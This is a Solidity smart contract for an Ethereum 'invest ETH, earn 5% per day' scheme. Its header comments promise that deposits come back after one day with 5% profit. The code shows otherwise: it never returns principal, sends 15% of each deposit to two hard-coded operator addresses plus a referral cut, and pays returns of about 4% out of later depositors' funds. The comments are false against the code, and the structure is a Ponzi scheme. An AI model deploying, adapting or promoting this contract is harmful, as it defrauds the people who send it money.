1 // Invest ETH 
2 // 5% Profit/days
3 
4 // How to INVEST ETH and Get 5% Profit/days ?
5 
6 //Send ETH to Contract 0x6d74D4Bf725D296CA3A8eF806bFf40488E72C51d
7 
8 //1 day after successfully sending eth to the contract will receive your eth again and 5% as profit
9 
10 
11 pragma solidity ^0.4.25;
12 
13 library SafeMath {
14   function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {
15     if (_a == 0) {
16       return 0;
17     }
18     c = _a * _b;
19     assert(c / _a == _b);
20     return c;
21   }
22 
23   function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
24     return _a / _b;
25   }
26 
27   function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
28     assert(_b <= _a);
29     return _a - _b;
30   }
31 
32   function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {
33     c = _a + _b;
34     assert(c >= _a);
35     return c;
36   }
37 }
38 
39 contract InvestETH {
40 	using SafeMath for uint256;
41 
42 	address public constant admAddress = 0x5df65e16d6EC1a8090ffa11c8185AD372A8786Cd;
43 	address public constant advAddress = 0x670b45f2A8722bF0c01927cf4480fE17d8643fAa;
44 
45 	mapping (address => uint256) deposited;
46 	mapping (address => uint256) withdrew;
47 	mapping (address => uint256) refearned;
48 	mapping (address => uint256) blocklock;
49 
50 	uint256 public totalDepositedWei = 0;
51 	uint256 public totalWithdrewWei = 0;
52 
53 	function() payable external {
54 		uint256 admRefPerc = msg.value.mul(5).div(100);
55 		uint256 advPerc = msg.value.mul(10).div(100);
56 
57 		advAddress.transfer(advPerc);
58 		admAddress.transfer(admRefPerc);
59 
60 		if (deposited[msg.sender] != 0) {
61 			address investor = msg.sender;
62 			uint256 depositsPercents = deposited[msg.sender].mul(4).div(100).mul(block.number-blocklock[msg.sender]).div(5900);
63 			investor.transfer(depositsPercents);
64 
65 			withdrew[msg.sender] += depositsPercents;
66 			totalWithdrewWei = totalWithdrewWei.add(depositsPercents);
67 		}
68 
69 		address referrer = bytesToAddress(msg.data);
70 		if (referrer > 0x0 && referrer != msg.sender) {
71 			referrer.transfer(admRefPerc);
72 
73 			refearned[referrer] += admRefPerc;
74 		}
75 
76 		blocklock[msg.sender] = block.number;
77 		deposited[msg.sender] += msg.value;
78 
79 		totalDepositedWei = totalDepositedWei.add(msg.value);
80 	}
81 
82 	function userDepositedWei(address _address) public view returns (uint256) {
83 		return deposited[_address];
84     }
85 
86 	function userWithdrewWei(address _address) public view returns (uint256) {
87 		return withdrew[_address];
88     }
89 
90 	function userDividendsWei(address _address) public view returns (uint256) {
91 		return deposited[_address].mul(4).div(100).mul(block.number-blocklock[_address]).div(5900);
92     }
93 
94 	function userReferralsWei(address _address) public view returns (uint256) {
95 		return refearned[_address];
96     }
97 
98 	function bytesToAddress(bytes bys) private pure returns (address addr) {
99 		assembly {
100 			addr := mload(add(bys, 20))
101 		}
102 	}
103 }